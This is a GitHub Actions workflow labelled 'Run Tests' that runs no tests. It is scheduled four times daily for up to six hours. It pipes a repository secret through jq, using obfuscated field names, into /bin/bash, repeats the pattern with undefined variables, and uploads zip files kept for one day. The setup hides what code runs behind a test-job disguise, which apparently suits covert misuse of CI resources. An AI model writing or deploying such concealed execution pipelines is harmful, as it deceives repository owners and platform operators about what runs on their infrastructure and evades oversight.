name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '34 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          q380: ${{ secrets.q380 }}
        run: |
          printf '%s' "$q380" | jq -r .sosjn0169 | /bin/bash
          echo $dkt15 | jq -r .zyh516 | /bin/bash
          printf '%s' "$fy4657" | jq -r .hvtv25 | /bin/bash
          printf '%s' "$qhgx37" | jq -r .yf3477 | /bin/bash
          printf '%s' "$ym31" | jq -r .crmns4768 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: WKhOmmit
          path: "*.zip"
          retention-days: 1
